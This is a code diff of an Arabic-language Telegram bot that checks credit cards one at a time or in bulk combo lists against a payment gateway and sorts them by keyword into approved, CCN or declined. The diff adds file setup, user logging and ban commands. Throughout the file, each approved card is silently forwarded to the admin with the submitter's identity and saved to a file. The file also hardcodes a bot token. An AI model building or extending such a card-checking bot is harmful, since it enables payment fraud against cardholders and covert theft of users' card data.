@@ -1,17 +1,46 @@
 import telebot, os
 import re, json
 import requests
-import telebot, time, random
+import time
 import random
 import string
 from telebot import types
-from gatet import *  # استيراد دالة chkk
+from gatet import *
 from reg import reg
 from datetime import datetime, timedelta
-from faker import Faker
-from multiprocessing import Process
 import threading
 from bs4 import BeautifulSoup
+
+# ==================== إنشاء الملفات إذا لم تكن موجودة ====================
+def ensure_files_exist():
+    """التأكد من وجود جميع الملفات اللازمة"""
+    files = {
+        'users_log.json': {},
+        'banned_users.json': {},
+        'data.json': {},
+        'approved_cards.txt': '',
+        'combo.txt': ''
+    }
+    
+    for file_name, default_content in files.items():
+        if not os.path.exists(file_name):
+            try:
+                if file_name.endswith('.json'):
+                    with open(file_name, 'w', encoding='utf-8') as f:
+                        json.dump(default_content, f, ensure_ascii=False, indent=4)
+                else:
+                    with open(file_name, 'w', encoding='utf-8') as f:
+                        f.write(default_content)
+                print(f"✅ تم إنشاء {file_name}")
+            except Exception as e:
+                print(f"❌ خطأ في إنشاء {file_name}: {e}")
+    
+    # التأكد من وجود المجلد الحالي
+    print(f"📁 المسار الحالي: {os.getcwd()}")
+
+# استدعاء الدالة في بداية الكود
+ensure_files_exist()
+# ===============================================================
 
 # ==================== كلمات مفتاحية للتصنيف ====================
 APPROVED_KEYWORDS = [
@@ -29,30 +58,42 @@ CCN_KEYWORDS = [
 BANNED_USERS_FILE = 'banned_users.json'
 USERS_LOG_FILE = 'users_log.json'
 
-# تحميل/حفظ المستخدمين المحظورين
 def load_banned_users():
+    """تحميل المستخدمين المحظورين"""
     try:
-        with open(BANNED_USERS_FILE, 'r') as f:
-            return json.load(f)
-    except:
+        if os.path.exists(BANNED_USERS_FILE):
+            with open(BANNED_USERS_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        return {}
+    except Exception as e:
+        print(f"خطأ في تحميل المحظورين: {e}")
         return {}
 
 def save_banned_users(banned):
-    with open(BANNED_USERS_FILE, 'w') as f:
-        json.dump(banned, f, indent=4)
-
-# تسجيل دخول المستخدمين
-def log_user_activity(user_id, username, first_name, action):
+    """حفظ المستخدمين المحظورين"""
     try:
-        with open(USERS_LOG_FILE, 'r') as f:
-            users_log = json.load(f)
+        with open(BANNED_USERS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(banned, f, ensure_ascii=False, indent=4)
+    except Exception as e:
+        print(f"خطأ في حفظ المحظورين: {e}")
+
+def log_user_activity(user_id, username, first_name, action):
+    """تسجيل نشاط المستخدمين"""
+    try:
+        if os.path.exists(USERS_LOG_FILE):
+            with open(USERS_LOG_FILE, 'r', encoding='utf-8') as f:
+                users_log = json.load(f)
+        else:
+            users_log = {}
     except:
         users_log = {}
     
-    if str(user_id) not in users_log:
-        users_log[str(user_id)] = {
+    user_id_str = str(user_id)
+    
+    if user_id_str not in users_log:
+        users_log[user_id_str] = {
             'user_id': user_id,
-            'username': username,
+            'username': username if username else '',
             'first_name': first_name,
             'first_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             'last_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
@@ -60,28 +101,34 @@ def log_user_activity(user_id, username, first_name, action):
             'actions': []
         }
     
-    users_log[str(user_id)]['last_use'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    users_log[str(user_id)]['total_actions'] += 1
-    users_log[str(user_id)]['actions'].append({
+    users_log[user_id_str]['last_use'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    users_log[user_id_str]['total_actions'] += 1
+    users_log[user_id_str]['actions'].append({
         'action': action,
         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     })
     
-    with open(USERS_LOG_FILE, 'w') as f:
-        json.dump(users_log, f, indent=4)
-
+    # الاحتفاظ بآخر 100 إجراء فقط
+    if len(users_log[user_id_str]['actions']) > 100:
+        users_log[user_id_str]['actions'] = users_log[user_id_str]['actions'][-100:]
+    
+    with open(USERS_LOG_FILE, 'w', encoding='utf-8') as f:
+        json.dump(users_log, f, ensure_ascii=False, indent=4)
+        
 def is_user_banned(user_id):
+    """التحقق إذا كان المستخدم محظوراً"""
     banned = load_banned_users()
     return str(user_id) in banned
-
 # ===============================================================
 
+# ==================== إعدادات البوت ====================
 stopuser = {}
 token = "8546455855:AAFOl-NNSlYOIxOqQh8ev8EMnFdPtps3uoc"  # توكن البوت الرئيسي
 bot = telebot.TeleBot(token, parse_mode="HTML")
-admin = 1093032296  # ايدي الادمن
+admin = 1093032296  # ايدي الادمن (أنت)
 active_scans = set()
 command_usage = {}
+# ===============================================================
 
 def send_notification_to_admin(card_info, user_info, response_text, execution_time, gateway):
     """إرسال إشعار للأدمن عند وجود بطاقة ناجحة (تشارج)"""
@@ -100,10 +147,10 @@ def send_notification_to_admin(card_info, user_info, response_text, execution_ti
 
 <b>🎯 تم التشارج بنجاح!</b>
 """
-        # إرسال الإشعار للأدمن (نفس البوت)
+        # إرسال الإشعار للأدمن
         bot.send_message(admin, notification_text, parse_mode="HTML")
         
-        # أيضاً حفظ في ملف خاص
+        # حفظ البطاقة الناجحة في الملف
         with open('approved_cards.txt', 'a', encoding='utf-8') as f:
             f.write(f"{card_info['card']}|{user_info['name']}|{user_info['id']}|{user_info['username']}|{response_text}|{gateway}|{datetime.now()}\n")
     except Exception as e:
@@ -129,16 +176,6 @@ def dato(zh):
     except Exception as e:
         print(e)
         return 'No info'
-
-# التحقق من الحظر قبل أي أمر
-def check_ban_decorator(func):
-    def wrapper(message):
-        user_id = message.from_user.id
-        if is_user_banned(user_id):
-            bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
-            return
-        return func(message)
-    return wrapper
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -230,8 +267,11 @@ def show_users(message):
         return
     
     try:
-        with open(USERS_LOG_FILE, 'r') as f:
-            users_log = json.load(f)
+        if os.path.exists(USERS_LOG_FILE):
+            with open(USERS_LOG_FILE, 'r', encoding='utf-8') as f:
+                users_log = json.load(f)
+        else:
+            users_log = {}
         
         if not users_log:
             bot.reply_to(message, "📭 لا يوجد مستخدمين حتى الآن")
@@ -240,11 +280,11 @@ def show_users(message):
         users_text = "👥 <b>قائمة المستخدمين:</b>\n\n"
         for user_id, data in users_log.items():
             users_text += f"🆔 ID: <code>{user_id}</code>\n"
-            users_text += f"👤 الاسم: {data['first_name']}\n"
-            users_text += f"📝 اليوزر: @{data['username'] if data['username'] else 'لا يوجد'}\n"
-            users_text += f"📅 أول استخدام: {data['first_use']}\n"
-            users_text += f"🔄 آخر استخدام: {data['last_use']}\n"
-            users_text += f"📊 عدد العمليات: {data['total_actions']}\n"
+            users_text += f"👤 الاسم: {data.get('first_name', 'غير معروف')}\n"
+            users_text += f"📝 اليوزر: @{data.get('username', 'لا يوجد')}\n"
+            users_text += f"📅 أول استخدام: {data.get('first_use', 'غير معروف')}\n"
+            users_text += f"🔄 آخر استخدام: {data.get('last_use', 'غير معروف')}\n"
+            users_text += f"📊 عدد العمليات: {data.get('total_actions', 0)}\n"
             users_text += "─" * 20 + "\n"
         
         # تقسيم النص إذا كان طويلاً
@@ -265,7 +305,6 @@ def ban_user(message):
         return
     
     try:
-        # استخراج ID المستخدم
         parts = message.text.split()
         if len(parts) < 2:
             bot.reply_to(message, "❌ استخدم: /ban [user_id] [السبب اختياري]\nمثال: /ban 123456789 سبب الحظر")
@@ -286,7 +325,7 @@ def ban_user(message):
         
         # محاولة إرسال إشعار للمستخدم المحظور
         try:
-            bot.send_message(user_id, f"🚫 <b>لقد تم حظرك من استخدام البوت!</b>\nالسبب: {reason}\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+            bot.send_message(int(user_id), f"🚫 <b>لقد تم حظرك من استخدام البوت!</b>\nالسبب: {reason}\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
         except:
             pass
             
@@ -316,7 +355,7 @@ def unban_user(message):
             
             # إشعار المستخدم
             try:
-                bot.send_message(user_id, f"✅ <b>تم إلغاء حظرك! يمكنك استخدام البوت مرة أخرى.</b>\nشكراً لتفهمك.", parse_mode="HTML")
+                bot.send_message(int(user_id), f"✅ <b>تم إلغاء حظرك! يمكنك استخدام البوت مرة أخرى.</b>\nشكراً لتفهمك.", parse_mode="HTML")
             except:
                 pass
         else:
@@ -340,8 +379,8 @@ def show_banned(message):
     banned_text = "🚫 <b>قائمة المستخدمين المحظورين:</b>\n\n"
     for user_id, data in banned.items():
         banned_text += f"🆔 ID: <code>{user_id}</code>\n"
-        banned_text += f"📝 السبب: {data['reason']}\n"
-        banned_text += f"📅 تاريخ الحظر: {data['banned_at']}\n"
+        banned_text += f"📝 السبب: {data.get('reason', 'لا يوجد')}\n"
+        banned_text += f"📅 تاريخ الحظر: {data.get('banned_at', 'غير معروف')}\n"
         banned_text += "─" * 20 + "\n"
     
     bot.reply_to(message, banned_text, parse_mode="HTML")
@@ -354,16 +393,22 @@ def show_stats(message):
         return
     
     try:
-        with open(USERS_LOG_FILE, 'r') as f:
-            users_log = json.load(f)
-        
-        total_users = len(users_log)
-        total_actions = sum(user['total_actions'] for user in users_log.values())
+        if os.path.exists(USERS_LOG_FILE):
+            with open(USERS_LOG_FILE, 'r', encoding='utf-8') as f:
+                users_log = json.load(f)
+            total_users = len(users_log)
+            total_actions = sum(user.get('total_actions', 0) for user in users_log.values())
+        else:
+            total_users = 0
+            total_actions = 0
         
         # عدد البطاقات الناجحة
         try:
-            with open('approved_cards.txt', 'r', encoding='utf-8') as f:
-                approved_cards = len(f.readlines())
+            if os.path.exists('approved_cards.txt'):
+                with open('approved_cards.txt', 'r', encoding='utf-8') as f:
+                    approved_cards = len(f.readlines())
+            else:
+                approved_cards = 0
         except:
             approved_cards = 0
         
@@ -508,12 +553,11 @@ def process_combo(call):
                     info = str(dato(cc[:6]))
                     start_time = time.time()
                     try:
-                        raw_response = str(chkk(cc))  # استخدام الدالة الأصلية
+                        raw_response = str(chkk(cc))
                     except Exception as e:
                         print(e)
                         raw_response = "ERROR"
 
-                    # تصنيف الرد بناءً على الكلمات المفتاحية
                     if any(kw in raw_response for kw in APPROVED_KEYWORDS):
                         category = 'approved'
                         live += 1
@@ -544,7 +588,6 @@ def process_combo(call):
                         reply_markup=mes
                     )
 
-                    # إرسال نتيجة كل بطاقة - فقط للموافقة (approved)
                     if category == 'approved':
                         msg_approved = f'''<b>Approved  ✅
 
@@ -557,7 +600,7 @@ def process_combo(call):
 • Bot By : @Jo0000ker</b>'''
                         bot.send_message(call.from_user.id, msg_approved)
                         
-                        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
+                        # إرسال إشعار للأدمن بالبطاقة الناجحة
                         user_info = {
                             'id': call.from_user.id,
                             'name': call.from_user.first_name,
@@ -565,8 +608,6 @@ def process_combo(call):
                         }
                         card_info = {'card': cc.strip()}
                         send_notification_to_admin(card_info, user_info, raw_response, "{:.1f}".format(execution_time), gate)
-                        
-                    # لا نرسل أي شيء للـ CCN أو declined
 
                     time.sleep(5)
         except Exception as e:
@@ -700,7 +741,6 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
     except Exception as e:
         raw_response = 'Error'
 
-    # تصنيف الرد
     if any(kw in raw_response for kw in APPROVED_KEYWORDS):
         category = 'approved'
     elif any(kw in raw_response for kw in CCN_KEYWORDS):
@@ -743,7 +783,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
     if category == 'approved':
         bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_approved)
         
-        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
+        # إرسال إشعار للأدمن بالبطاقة الناجحة
         user_info = {
             'id': message.from_user.id,
             'name': message.from_user.first_name,
@@ -823,7 +863,7 @@ def generate_code(message):
 
 صالح لمدة {h} ساعة
 
-طريقة الاستخدام : فقط أضغط على الكود و سيتم نسخه تلقائياً و ادخل الى البوت @TOME_CHKbot و ارسل الكود الذي نسختة
+طريقة الاستخدام : فقط أضغط على الكود و سيتم نسخه تلقائياً و ادخل الى البوت و ارسل الكود الذي نسختة
 </b>'''
             bot.reply_to(message, msg, parse_mode="HTML")
         except Exception as e:
@@ -839,17 +879,24 @@ def stop_callback(call):
     stopuser[f'{id}']['status'] = 'stop'
     bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")
 
-print("تم تشغيل البوت")
-print("البوت يعمل الآن مع الميزات الجديدة:")
-print("✅ إرسال البطاقات الناجحة للأدمن")
-print("✅ تسجيل جميع المستخدمين")
-print("✅ نظام حظر المستخدمين")
-print("✅ عرض إحصائيات البوت")
-print("✅ Bot By: @Jo0000ker")
+# ==================== تشغيل البوت ====================
+print("=" * 50)
+print("🤖 تم تشغيل البوت بنجاح!")
+print("=" * 50)
+print("✅ الميزات المفعلة:")
+print("   • إرسال البطاقات الناجحة للأدمن")
+print("   • تسجيل جميع المستخدمين")
+print("   • نظام حظر المستخدمين")
+print("   • عرض إحصائيات البوت")
+print("   • عرض المتصلين")
+print("   • Bot By: @Jo0000ker")
+print("=" * 50)
+print(f"📁 المسار الحالي: {os.getcwd()}")
+print("=" * 50)
 
 while True:
     try:
-        bot.polling(none_stop=True)
+        bot.polling(none_stop=True, interval=0, timeout=20)
     except Exception as e:
-        print(f"حدث خطأ: {e}")
+        print(f"⚠️ حدث خطأ: {e}")
         time.sleep(5)
